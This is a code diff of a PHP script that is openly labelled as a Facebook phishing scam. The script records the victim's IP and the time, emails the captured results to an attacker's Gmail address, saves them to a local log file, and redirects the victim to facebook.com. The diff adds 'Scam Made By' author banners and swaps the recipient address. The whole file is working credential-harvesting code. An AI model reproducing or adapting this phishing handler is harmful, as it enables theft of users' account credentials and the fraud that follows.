@@ -1,5 +1,10 @@
 <?php
 
+/**   Scam Made By SykRit 2016=====201?  **/
+/**   Scam Made By SykRit 2016=====201?  **/
+/**   Scam Made By SykRit 2016=====201?  **/
+/**   Scam Made By SykRit 2016=====201?  **/
+/**   Scam Made By SykRit 2016=====201?  **/
 
 $date = gmdate ("d-n-Y");
 $time = gmdate ("H:i:s");
@@ -12,7 +17,7 @@ $message .= "----------\n";
 $message .= "IP: ".$ip."\n";
 $message .= "Log : $time / $date \n";
 $rnessage = "$message\n";
-$send= "haso91513@gmail.com";
+$send= "hasonefff2690@gmail.com";
 $subject = "FaceBook SpAm ReZulT | $ip";
 $headers = "From: FaceBook SpAm ReZulT";
 $file = fopen("SykRit_RzLt.txt","ab");
@@ -26,5 +31,10 @@ mail($Send,$subject,$rnessage,$headers);
 }
 header("Location: https://www.facebook.com/");
 
+/***   Scam Made By SykRit 2016=====201?  **/
+/***   Scam Made By SykRit 2016=====201?  **/
+/***   Scam Made By SykRit 2016=====201?  **/
+/***   Scam Made By SykRit 2016=====201?  **/
+/***   Scam Made By SykRit 2016=====201?  **/
 
 ?>
